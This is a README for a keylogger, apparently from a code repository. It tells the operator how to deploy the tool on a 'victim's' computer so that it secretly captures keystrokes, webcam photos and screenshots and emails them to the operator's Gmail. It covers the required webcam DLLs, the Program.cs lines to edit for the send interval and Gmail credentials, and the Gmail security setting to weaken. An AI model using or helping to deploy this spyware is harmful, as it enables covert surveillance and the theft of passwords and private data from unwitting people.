# What would he do?
This keylogger after a certain period of time will send you in the Gmail all that the "victim" typed + photo + screenshot

# What is the need?
In order for this Keylogger to function properly on the "victim's" computer, in addition to the exe file, there must be some files for working with webcam (x64, x32, Emgu.CV.World.dll)
You also need to change some lines from Program.cs
``` 
private readonly int Internal = 400; // number of characters through which the message will be sent
private readonly string email = ""; // Gmail login
private readonly string password = ""; // password 
```


Allow access to less secure apps on your gmail account:
https://www.google.com/settings/security/lesssecureapps
		
